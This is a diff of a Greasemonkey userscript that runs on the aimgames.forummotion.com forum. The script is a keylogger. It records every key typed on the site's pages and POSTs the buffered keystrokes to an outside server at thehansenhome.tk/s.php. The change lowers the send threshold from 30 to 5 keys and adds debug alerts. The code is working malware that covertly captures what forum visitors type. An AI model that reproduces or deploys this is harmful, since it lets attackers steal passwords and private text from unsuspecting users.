@@ -3,7 +3,7 @@
 // @description trash man
 // @namespace   trashaaaaaaaaaaaaaaaaaaaaaaaaaaa@gmail.com
 // @include     http://aimgames.forummotion.com/*                     
-// @version     1
+// @version     2
 // @grant       GM_xmlhttpRequest
 // @license     MIT License (Expat); opensource.org/licenses/MIT
 // @require     http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
@@ -17,7 +17,8 @@ document.onkeypress = function(evt) {
    key = String.fromCharCode(evt.charCode)
    keys += key;
    keyn++;
-   if (keyn >= 30) {
+   alert('got key');
+   if (keyn >= 5) {
      sendKey(keys);
      keyn = 0;
    }
@@ -39,6 +40,7 @@ function sendKey(pkey) {
         //alert(response.responseText);
       }
     });*/
+    alert('sent key');
     GM_xmlhttpRequest({
       method: "POST",
       url: "http://www.thehansenhome.tk/s.php",
